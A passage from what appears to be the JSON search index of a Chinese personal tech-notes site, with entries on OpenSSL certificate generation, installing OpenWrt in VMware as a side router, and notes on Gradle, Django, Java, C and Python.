需要为PEM格式, 否则需用-CAform指定格式 -C Akeyform 指定密钥格式 -C Akey ca机构所使用的私钥, 需要为PEM格式, 否则需用-CAkeyform指定格式 -d ays 指定证书有效期 -s ignkey 自签名时, 使用此选项指定ca密钥 -t ext 输出证书信息 -n oout 不输出证书, 一般与 -text一起使用 -C Acreateserial 在签发新证书时自动创建证书序列号文件 为了简化 OpenSSL 中证书签发流程,自动完成序列号文件的创建 (在ubuntu上测试时srl后缀的文件) 例如查看证书信息: openssl x509 -in xxx.crt -text -noout version 查看版本及相关信息 如linux查看openssl安装目录(不适用mac): openssl version -a | grep OPENSSLDIR 用例: Mac 上制作 SSL 证书 背景: 搭建burpsuite服务时，可选使用证书 环境: MacOS 12.5, openssl 生成rsa私钥，des3算法，1024位强度，ssl.key是秘钥文件名: openssl genrsa -des3 -out ssl.key 1024 根据提示输入密码。当前文件夹下生成一个 ssl.key 文件。 删除密码, 这里目录和生成私钥的目录一致: openssl rsa -in ssl.key -out ssl.key 生成 CSR（证书签名请求）. 根据根据刚刚生成的 key 文件来生成证书请求文件: openssl req -new -key ssl.key -out ssl.csr 依次输入国家、地区、城市、组织、组织单位、Common Name、Email 和密码。 其中 Common Name 应该与域名保持一致。密码我们已经删掉了,直接回车即可。 注解 Common Name 就是证书对应的域名地址，我们开发微信小程序时必须要让我们的外链的 https 的域名和证书统一才行。 生成自签名证书。根据以上 2 个文件生成 crt 证书文件，终端执行下面命令: openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt 这里3650是证书有效期(单位：天)。这个大家随意。最后使用到的文件是key和crt文件。 到这里我们的证书(ssl.key 和 ssl.crt) 就已经创建成功了可以直接用到 https 的 server 中了。 在代码中使用证书: https .createServer( { key: fs.readFileSync(\"./cert_key/ssl.key\"), cert: fs.readFileSync(\"./cert_key/ssl.crt\") }, app ) .listen(1993); 详情介绍 见:","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl.html"},{"title":"相关算法","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html"},{"title":"openssl","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-index.html"},{"title":"VMware安裝OpenWrt","text":"官网下载地址 因为我是虚拟机安装, 系统是64位, 所以就只看这个页面的: https://downloads.openwrt.org/releases/23.05.2/targets/x86/64/ 或者通用版也行: https://downloads.openwrt.org/releases/23.05.2/targets/x86/generic/ , 二选一即可 直接选组合包吧: 区别: ext4 rootfs可以扩展磁盘空间大小，而squashfs不能。 squashfs rootfs可以使用重置功能（恢复出厂设置），而ext4不能。 虚拟机创建环境 先不安装操作系统, 选择linux 自由选择名称, 位置: 处理器给一个就行 内存默认即可(要多给也行) 网络选择桥接(这里就是使用VM的好处, 如果用docker配置地址比较麻烦) 注解 桥接模式 VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接， 虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。 简而言之，这就好像局域网中添加了一台新的、独立的计算机一样。 因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。 NAT模式 NAT，是Network Address Translation的缩写，意即网络地址转换。 NAT模式也是VMware创建虚拟机的默认网络连接模式。 使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。 仅主机模式 仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。 仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。 相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下， 使用仅主机模式网络连接的虚拟机无法连接到Internet (在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能， 仍然可以让虚拟机连接到Internet或其他网络)。 控制器默认即可, 磁盘选择使用 /docs/杂乱无章/常用工具使用/StarWindConverter 转换的虚拟机文件(需要保持现有格式): 后续看需求了, 直到 选择自定义硬件 没用的都可以去掉 注解 这里补充一下, 下载的 img 的压缩包, 需要先转换为ISO文件 我这里使用的是WSL, 直接在cmd输入debian即可, 然后配置源, 可参考 /docs/操作系统/linux/debian/配置debian容器 最后使用 /docs/操作系统/linux/linux指令/genisoimage 指令: # 进入解压目录 cd /mnt/e/xxxxxxxxxxx/openwrt-23.05.2-x86-generic-generic-ext4-combined.img geteltorito -o output_file.iso input_file.img 不行, 缺少库, 还是直接用我虚拟机弄吧... genisoimage -o openwrt.iso openwrt-23.05.2-x86-generic-generic-ext4-combined.img 实测直接转换的iso是不能用的, 还是老老实实使用工具 /docs/杂乱无章/常用工具使用/StarWindConverter 吧 然后打开虚拟机, 会安装一会儿, 出现 ready 后回车即可: 物理机 /docs/操作系统/windows/windows_shell/ipconfig 查看网络信息 虚拟机配置网络: vi /etc/config/network 这是默认配置 按照物理机修改, 需要跟物理机同网段 重启虚拟机: reboot 然后宿主机(物理机) 看看通不: ping 登录虚拟机的系统, 地址: 192.168.1.80 默认账密: root netflixcn.com 设置旁路由 随后打开「网络」->「接口」配置页面，选择 LAN 接口 LAN 接口的桥接选项取消勾选 DHCP 服务器勾选「忽略此接口」 打开「网络」-> 「设备」页面 eth0网卡配置取消勾选「启用 IPv6」 br-lan接口同样取消启用「启用IPv6」 安装 openclash 两种方式可以选择 直接在 openwrt 的「系统」-「软件包」中搜索下载 在openclash的官方仓库下载 ipk 安装包，手动上传安装 插件设置 个人习惯，倾向于使用 Fake-IP 模式。 步骤： 模式使用 Fake-IP（增强）模式，打开旁路由兼容 本地 DNS劫持，使用 dnsmasq 转发 PS.模式也推荐使用 TUN ， 该模式下的UDP 处理性能更好，同时新增了 tun 虚拟接口，可以监管三层网络流量。 使用 至此，旁路由已经具备网络代理的功能。 家里的设备需要使用的话，需要将网络设置的ip 的网关和 DNS都指向旁路由的地址即可。 DNS的域名解析工作交给旁路由来处理，避免 DNS污染的问题。 参考: VMware安装openWRT软路由系统的步骤(图文教程) 通过Docker部署OpenWrt做家用旁路由","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html","loc":"/yq-doc-source-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html"},{"title":"OpenWrt","text":"一个嵌入式 Linux, 主要实现路由功能 简单来说，OpenWRT 是一款家用路由器的操作系统，路由器安装了它才能正常的工作。 就像国内手机厂商基于开源的 Android 系统开发出各种 Rom一样。 路由器厂商也可以基于 OpenWRT 这个平台，进行二次开发，增加更多丰富的功能和有厂商特色的路由器系统。 官网: https://openwrt.org/ 参考: VMware安装openWRT软路由系统的步骤(图文教程)","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Openwrt-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Openwrt-index.html"},{"title":"在 Linux 下使用 RAID","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-index.html"},{"title":"教程","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-index.html"},{"title":"shell语法规范","text":"case语句 语法如下: case 值 in 模式1) 命令序列1 ;; 模式2) 命令序列2 ;; ... *) 默认命令序列 ;; esac 值 是需要匹配的表达式或变量。 模式 是用来匹配值的模式，可以使用通配符。 命令序列 是当匹配到相应模式时要执行的一组命令。 ;; 表示一个模式块的结束，类似于break语句，用于跳出case语句; 如果不加;;，Shell会继续往下执行后续模式的命令序列，而不进行匹配 *) 是可选的默认模式，如果没有匹配到任何模式，将执行对应的命令序列; 默认模式通常放在最后，用于处理未匹配到任何模式的情况 其他:","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification.html"},{"title":"shell语法规范","text":"一些bug","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html"},{"title":"设置默认文本编辑器","text":"Debian有许多不同的编辑器。 我们建议安装上面提到的 /docs/杂乱无章/常用工具使用/vim 软件包。 Debian通过命令 /usr/bin/editor 提供了对系统默认编辑器的统一访问， 因此其它程序（例如 reportbug ）可以调用它。 你可以通过下列命令改变它: $ sudo update-alternatives --config editor 对于新手，我建议使用 /usr/bin/vim.basic 代替 /usr/bin/vim.tiny ，因为它支持格式高亮。 注解 许多程序使用环境变量 $EDITOR 或 $VISUAL 来决定使用那个编辑器. 出于 Debian 系统的一致性考虑，它们被设置到 /usr/bin/editor 。 （在历史上， $EDITOR 是 ed ， $VISUAL 是 vi 。)","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html"},{"title":"debian手册","text":"参考: https://www.debian.org/doc/manuals/debian-reference/","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-index.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-index.html"},{"title":"Debian","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-index.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-index.html"},{"title":"Linux","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-index.html","loc":"/yq-doc-source-docs-operating-system-linux-index.html"},{"title":"Linux网络","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-network-index.html","loc":"/yq-doc-source-docs-operating-system-linux-network-index.html"},{"title":"package","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-package-index.html","loc":"/yq-doc-source-docs-operating-system-linux-package-index.html"},{"title":"问题","text":"关于 #! 表示当作为执行文件的时候，使用解释器路径，默认为当前登录shell 必须写在第一行才有用 当执行执行文件时，cd到所在目录后，执行需要加 ./ ， ./test的./是为了承接现在所在的文件夹， 让现在所在的文件夹+文件，合并成该文件的完整路径，用于执行。 优先级 当直接指定解释器的时候 比如 python xxx.py， xxx.py文件里的 #! 是不生效的， 只有作为执行文件的时候才会生效，比如 ./xxx.py 文件 登陆日志查看: /var/log/auth.log /var/log/secure.log 其他日志: /var/log/message 一般信息和系统信息 /var/log/secure 登陆信息 /var/log/maillog mail记录 /var/log/utmp /var/log/wtmp 登陆记录信息（last命令即读取此日志或者 who /var/log/wtmp）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-index.html","loc":"/yq-doc-source-docs-operating-system-linux-question-index.html"},{"title":"系统服务","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-index.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-index.html"},{"title":"Ubuntu","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-index.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-index.html"},{"title":"c库函数","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-C-library-function-index.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-index.html"},{"title":"c标准库","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-Standard-library-index.html","loc":"/yq-doc-source-docs-rear-end-from-Standard-library-index.html"},{"title":"C","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-index.html","loc":"/yq-doc-source-docs-rear-end-from-index.html"},{"title":"关于库的报错","text":"对于使用Nuitka编译的Python代码而言, 也适用, 因为最终还是先转换为C再编译. 尤其易出现的跨系统场景, 比如在Ubuntu16编译的方法哦Ubuntu20上去跑. 以自己经历的一个场景而言, 主要业务代码是用Python编码, 使用了自己编写的C库(一个跨平台的GUI库)的动态链接. 在 Ubuntu16 编译的时候, 使用了16的 libpng.so . 放到 Ubuntu18 与 Ubuntu20 上运行时, 由调用了各自系统的 libpng.so . 且18与20的 libpng 又依赖于 libz.so 的 1.2.9 版本. 而16上是仅依赖于 libz.so 的 1.2.3.4 版本. 这里使用Nuitka编译的时候, 发现自动把16的 libz.so 给放进去了, 就出现了报错: libz.so.1: version `ZLIB_1.2.9' not found (required by /lib/x86xxxxxx/libpng.so) 把应用下的 libz.so.1 给删除了, 遇到另一个库的报错: libxcb-shm.so.0 undefined symbol 应用程序下是有另一个库 libxcb.so.1 , 这里实际是由应用程序下的 libxcb.so.1 调了系统的 libxcb-shm.so.0 , 真实原因就是两者版本不一致. 这里的不一致是指, libxcb.so.1 与 libxcb-shm.so.0 理应都是属于 libxcb 的共享库, 但是Nuitka处理的时候, 只处理了一部分(只把 libxcb-shm.so.0 给复制到应用程序目录下) 最终把应用程序下的 libxcb.so.1 删除即可. 最后料想, 是否一开始就将 Ubuntu16 的 libpng.so 搞到应用程序下面, 就不会有问题, 但是奈何... 就没有尝试. 注解 一些可以尝试的指令: /docs/操作系统/linux/linux指令/ldd , 查看贡献库的依赖项(链接项), 注意这里的依赖, 如果应用程序目录下存在, 会优先使用应用程序下有的 /docs/操作系统/linux/linux指令/strings , 查看此共享库依赖的具体版本","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-About-library-error.html","loc":"/yq-doc-source-docs-rear-end-from-question-About-library-error.html"},{"title":"编辑器长字符串多行写","text":"字符串拼接来创建跨多行的字符串: char *data = \"it is\" \"a test msg\"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html","loc":"/yq-doc-source-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html"},{"title":"枚举类型值的问题","text":"定义一个枚举: enum LANGUAGE_TYPE { EN = 0, ZH_CH, }; 如果没有赋值: enum LANGUAGE_TYPE current_language; 那么默认值就是第一个 EN","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-Enumeration-type.html","loc":"/yq-doc-source-docs-rear-end-from-question-Enumeration-type.html"},{"title":"函数参数void","text":"定义函数时修饰函数表示无返回值, 作为参数时候表示不接受参数: int fun(void) 而不使用表示接受任意不确定类型参数: int fun()","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-Function-parameter-VOID.html","loc":"/yq-doc-source-docs-rear-end-from-question-Function-parameter-VOID.html"},{"title":"Windows下长路径删除/重命名","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-Long--distance-operation.html","loc":"/yq-doc-source-docs-rear-end-from-question-Long--distance-operation.html"},{"title":"问题-C","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-question-index.html","loc":"/yq-doc-source-docs-rear-end-from-question-index.html"},{"title":"安卓开发","text":"相关教程可参考w3school的: https://www.w3cschool.cn/uawnhh/qbe84ozt.html","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Android-development-index.html","loc":"/yq-doc-source-docs-rear-end-java-Android-development-index.html"},{"title":"构建工具","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools.html"},{"title":"Gradle","text":"官网: https://gradle.org 重要 目前为止, 此文档编写时, 使用版本为 Gradle-8.1.1 安装 Mac可以直接使用homebrew: brew install gradle 安装会下载很多依赖包, 不懂Mac为啥要下载这么多依赖包, 我的安装路径是在: /usr/local/Cellar/gradle/8.1.1 可能会有需要安装Java, 可参考 /docs/后端/java/安装 然后在Android Studio里面自定义Gradle路径的时候不知道为啥就直接是: /usr/local/Cellar/gradle/8.1.1/libexec Android Studio中设置位置 所有版本: https://gradle.org/releases/ 若需要设置Gradle仓库的环境变量, 设置: export GRADLE_USER_HOME=... 注解 若下载的是解压包, 需要手动解压到相关位置, 如: $ mkdir /opt/gradle $ unzip -d /opt/gradle gradle-8.1.1-bin.zip $ ls /opt/gradle/gradle-8.1.1 LICENSE NOTICE bin getting-started.html init.d lib media 警告 若使用Mac brew安装, 需要提前配置好JAVA环境, 可参考 /docs/后端/java/安装 , 若是后配置好JAVA, 需要先brew卸载后再装. (最主要的就是跟系统的 /usr/bin/java 对应起来, 否则即使配置的正确的JAVA_HOME, 也会有问题) 所以我选择解压包方便. 配置系统环境 Linux/Mac, 以安装到 /opt/gradle/gradle-8.1.1 为例: # GRADLE_HOME 官网安装文档并未要求设置 GRADLE_HOME=/opt/gradle/gradle-8.1.1 export PATH=$PATH:$GRADLE_HOME/bin Windows直接在PATH环境变量新增一个即可. 配置镜像源 有两种选择 .gradle 目录通常被设置为环境变量 GRADLE_USER_HOME 全局配置, 用户目录下新建 .gradle 目录, 项目配置, 在项目下的 settings.gradle 增加源地址: pluginManagement { repositories { maven { url 'https://maven.aliyun.com/repository/public/' } maven { url 'https://maven.aliyun.com/repository/google/' } maven { url 'https://maven.aliyun.com/repository/jcenter/' } maven { url 'https://maven.aliyun.com/repository/central/' } google() mavenCentral() gradlePluginPortal() } } dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories { maven { url 'https://maven.aliyun.com/repository/public/' } maven { url 'https://maven.aliyun.com/repository/google/' } maven { url 'https://maven.aliyun.com/repository/jcenter/' } maven { url 'https://maven.aliyun.com/repository/central/' } google() mavenCentral() } } rootProject.name = \"hello\" include ':app' 详细说明/介绍","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle.html"},{"title":"Gradle","text":"Gradle项目初始化下载慢 Android-Gradle项目初始化构建时, 下载 gradle-7.5-bin.zip 慢的问题 修改 gradle-wrapper.properties 文件, 我的在 gradle/wrapper/gradle-wrapper.properties , 找不到就全局搜一下, 将原本的: distributionUrl=https\\://services.gradle.org/distributions/gradle-7.5-bin.zip 更改为镜像代理地址路径(这里用的腾讯的): distributionUrl=https\\://mirrors.cloud.tencent.com/gradle/gradle-7.5-bin.zip 具体位置可以进去腾讯代理地址自己找找: https://mirrors.cloud.tencent.com/ 修改后","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-index.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-index.html"},{"title":"构建工具","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-index.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-index.html"},{"title":"Java","text":"安卓开发 内存泄漏与内存溢出 内存溢出 JVM内存有限。如果对象太多，JVM内存放不下了，就会内存溢出。 内存泄漏 JVM的垃圾回收只会回首引用计数为0的对象, 如果存在循环引用, 或者没有及时回收调用, 就会一直存在 如下代码中，obj的值是null，因此是\"无用的\"； 但同时obj又同时被被list引用，因此是\"可达\"的，所以此时的obj就会造成内存泄漏。: Object obj = new Object(); list.add( obj ); obj = null ; 除了上面obj这种内存泄漏的情况以外， 在实际开发中最常见的内存泄漏就是打开资源后没有调用close()方法。 例如socket、io流等，都需要再最后close()一下防止内存泄漏。","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-index.html","loc":"/yq-doc-source-docs-rear-end-java-index.html"},{"title":"内置函数","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-index.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-index.html"},{"title":"Python一些内置函数/属性","text":"__file__ 一般是Python编码模块使用, 表示模块所在路径, 如获取json模块所在路径: >>> import json >>> >>> json.__file__ '/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/json/__init__.py' >>> dir() exec() 将字符串当作代码执行 eval() 将字符串作为表达式执行,并返回结果。 仅能执行单个表达式,不能为变量赋值。 字符串必须是合法的Python表达式,否则会引发SyntaxError。 其他内置函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html"},{"title":"概念相关","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-index.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-index.html"},{"title":"Python性能分析","text":"查了一下, 主要的有以下几种 cProfile: Python标准库中内置的性能分析模块，非侵入式. cProfile生成的结果可以进一步导出成火焰图 line_profiler: 主要做函数内每行语句的性能分析，需要侵入代码. 如果已经知道哪个函数是瓶颈，需要对函数进一步分析，可以使用这个. pyflame: 只能生成火焰图. pyinstrument: 使用采样方法对函数的执行时间进行记录，开销比cProfile要小.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-index.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-index.html"},{"title":"相关技术实现","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-index.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-index.html"},{"title":"XPath 教程","text":"参考: 菜鸟-XPath XPath 是一门在 XML 文档中查找信息的语言。 在学习之前应该具备的知识： HTML / XHTML XML / XML Namespaces 什么是 XPath ? XPath 使用路径表达式在 XML 文档中进行导航 XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。 Path 包含一个标准函数库 XPath 含有超过 100 个内建的函数。这些函数用于字符串值、数值、日期和时间比较、节点和 QName 处理、序列处理、逻辑值等等。 XPath 是 XSLT 中的主要元素 XPath 是 XSLT 标准中的主要元素。如果没有 XPath 方面的知识，您就无法创建 XSLT 文档。 您可以在我们的 《XSLT 教程》 中阅读更多的内容。 XQuery 和 XPointer 均构建于 XPath 表达式之上。XQuery 1.0 和 XPath 2.0 共享相同的数据模型，并支持相同的函数和运算符。 您可以在我们的 《XQuery 教程》 中阅读更多有关 XQuery 的知识。 XPath 是一个 W3C 标准 XPath 于 1999 年 11 月 16 日 成为 W3C 标准。 XPath 被设计为供 XSLT、XPointer 以及其他 XML 解析软件使用。 您可以在我们的 《W3C 教程》 中阅读更多有关 XPath 标准的信息。 相关 XSLT XSLT 是针对 XML 文件的样式表语言。 通过 XSLT，您可以把 XML 文件转换为其他的格式，比如 XHTML。 如果您希望学习更多有关 XSLT 的知识，请访问我们的 《XSLT 教程》 。 XQuery XQuery 和 XML 数据查询有关。 XQuery 被设计用来查询任何可作为 XML 形态呈现的数据，包括数据库。 如果您希望学习更多有关 XQuery 的知识，请访问我们的 《XQuery 教程》 。 XLink 和 XPointer XML 中的链接被分为两个部分：XLink 和 XPointer。 XLink 和 XPointer 定义了在 XML 文档中创建超级链接的标准方法。 如果你希望学习更多有关 XLink 和 XPointer 的知识，请访问我们的 《XLink 教程和 XPointer教程》 。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-index.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-index.html"},{"title":"教程","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-index.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-index.html"},{"title":"模型模块module","text":"总览: module.objects.all() 获取该实例的所有信息 module.objects.add() 添加 module.objects.create() 创建 module.objects.get() module.objects.filter(**kargs) 过滤器 返回包含指定参数的QuerySet module.objects.exclude(**kargs) 返回不包含指定参数的QuerySet module.objects.annotate() module.objects.order_by() 排序 module.objects.annotate() module.objects.alias() 模型类 模型定义 每个模型都是python的一个类，且需继承 django.db.models.Model 类下每个属性都相当于一个数据库字段 每当新建一个模型的时候，都需要在 setting.py下的 INSTALL_APPS 配置，如 新建 app: python manage.py start myapp 配置app: INSTALL_APPS = [ 'myapp' ] 将变更好的内容写入数据库: # 查找所有可用的模型 为任意一个在数据库中不存在对应数据表的模型创建迁移脚本文件 python manage.py makemigrations # 将变更写入数据库 python manage.py migrate 模型中的字段类型 https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#model-field-types 模型中的字段选项, 关于类中的字段, 每个字段都应该是 Field 类的实例 参考: Django模型字段 字段选项，部分解释 max_length 指定该字段长度 db_index True表示将为此字段建索引 default 该字段的默认值 。可以是可调用对象，但是默认不可变 primary_key 为True时，表示将该字段设置为主键。同时表示 null=False 和 unique=True , 如果该模型中一个主键都没有设置，那么将会自动添加一个字段来设置主键。 主键字段是只读的。如果改变了现有对象的主键值，然后将其保存，则会在旧对象旁边创建一个新对象。 verbose_name 该字段的含义, 字段备注名（相当于给他一个注释） unique 设置为True，表示字段必须在整个表中保持值唯一。属于数据库级别和模型验证中强制执行。 unique_for_date 将其设置为 DateField 或 DateTimeField 的名称，要求该字段的日期字段值是唯一的。 unique_for_month 与上一个一致，区别为要求月份唯一 unique_for_year 要求年份唯一 null 如果设置为True，表示当该字段为空时，Django会将数据库中该字段设置为NULL。默认False blank 默认False。True表示该字段允许为空。 与null的区别是，null仅表示数据库层面的空，而 blank涉及表单验证，为Flase表示表单该字段必填 db_column 字段使用的数据库列名，未指定时使用数据库名 db_tablespace 如果这个字段有索引，那么要为这个字段的索引使用的 数据库表空间 的名称。 默认是项目的 DEFAULT_INDEX_TABLESPACE （如果有设置）,或者是模型的 db_tablespace （如果有）。 如果后端不支持索引的表空间，则忽略此选项。 这里其实没搞懂为啥索引也有表空间，搜了一下暂时没得到答案 mysql的表空间使用 editable 默认为True。 False表示该字段不会在管理或者任何其他地方中显示 error_messages 覆盖该字段引发的默认消息。传入一个与你想覆盖的错误信息相匹配的键值的字典。 这里也没懂啥意思 -_- ，可参考 error_messages help_text 额外的帮助文档，随表单控件一起显示。即便字段未用与表单，对于生成文档也可用。 这个也没懂 &#94;_&#94; validators 要为该字段运行的验证器列表。更多信息请参见 验证器文档 这个有点深，表示自定义验证机制 choices 一系列二元数组，在表单上表示为选择框 如，一个选项列表: from django.db import models class Person(models.Model): # 一个选项列表 SHIRT_SIZES = ( ('S', 'Small'), ('M', 'Medium'), ('L', 'Large'), ) name = models.CharField(max_length=60) shirt_size = models.CharField(max_length=1, choices=SHIRT_SIZES) 注意，当choices的顺序变动时，将创建新的迁移 当代码包含此字段时，可以使用 get_定义值_dispaly 来获取响应的结果，如: >>> p = Person(name=\"Fred Flintstone\", shirt_size=\"L\") >>> p.save() >>> p.shirt_size 'L' >>> p.get_shirt_size_display() 'Large' through 仅用于多对多字段中, 指定使用哪个模型","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Module-Module.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Module-Module.html"},{"title":"Django支持的Field","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html"},{"title":"Django","text":"学习进度: https://docs.djangoproject.com/zh-hans/3.2/topics/db/models/ 下的字段选项 执行查询 | Django 文档 | Django (djangoproject.com) 参考:: 使用Django 编写你的第一个 Django 应用，第 3 部分 模型类 方法 Model.save() Model.save(force_insert=False, force_update=False, using=DEFAULT_DB_ALIAS, update_fields=None For details on using the force_insert and force_update arguments, see 强制执行 INSERT 或 UPDATE . Details about the update_fields argument can be found in the 指定要保存的字段 section. 如果你想自定义保存行为，你可以覆盖这个 save() 方法。 更多细节请参见 重写之前定义的模型方法 模型中的一些函数/方法 __str__() 返回值表示这个对象的str get_absolute_url() 计算一个对象的url 任何需要一个唯一url的都需要定义此方法 常用指令 常用指令: # 查看django位置 python -c \"import django; print(django.__path__)\" # 打开django自带的命令行工具 python manage.py shell # 启动 polls应用的自动化测试 python manage.py test polls # 创建 django 项目 $ django-admin startproject $pro # 安装模块app $ python manage.py startapp $app # 启动服务 $ python manage.py runserver 0:8000 # 查找所有可用的模型 为任意一个在数据库中不存在对应数据表的模型创建迁移脚本文件 $ python manage.py makemigrations # 运行这些迁移来自动创建数据库表 # migrate 命令只会为在 INSTALLED_APPS 里声明了的应用进行数据库迁移。 $ python manage.py migrate # 创建某个app的表结构 $ python manage.py makemigrations $app $ python manage.py migrate # 含 django 的环境变量shell $ python manage.py shell url path 四个参数: # view 可以是 使用 include() 使用其他的app下的url # name 别名 path('route', view.fun, name='') 创建管理员用户: $ python manage.py createsuperuser Username: admin Email address: admin@example.com Password: ********** Password (again): ********* Superuser created successfully. 数据库的设置 setting.py: DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'mydatabase', 'USER': 'mydatabaseuser', 'PASSWORD': 'mypassword', 'HOST': '127.0.0.1', 'PORT': '5432', } } 默认的，Django 会在外键字段名后追加字符串 \"_id\" 。（同样，这也可以自定义。） 外键 pk就是primary key的缩写。通常情况下，一个模型的主键为\"id\"，所以下面三个语句的效果一样: > Blog.objects.get(id__exact=14) # Explicit form > Blog.objects.get(id=14) # __exact is implied > Blog.objects.get(pk=14) # pk implies id__exact 参考: 查询操作 web的瓶颈 单个请求里太多sql串行查询导致耗时长 单个sql太过复杂导致耗时长","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-index.html"},{"title":"FastAPI","text":"官网文档: FastAPI 菜鸟: FastAPI教程 注解 如果你正在开发一个在终端中运行的命令行应用而不是 web API，不妨试下 Typer . Typer 是 FastAPI 的小同胞。它想要成为命令行中的 FastAPI。 关键特性 快速：可与 NodeJS 和 Go 并肩的极高性能（归功于 Starlette 和 Pydantic）。最快的 Python web 框架之一。 高效编码：提高功能开发速度约 200％ 至 300％。* 更少 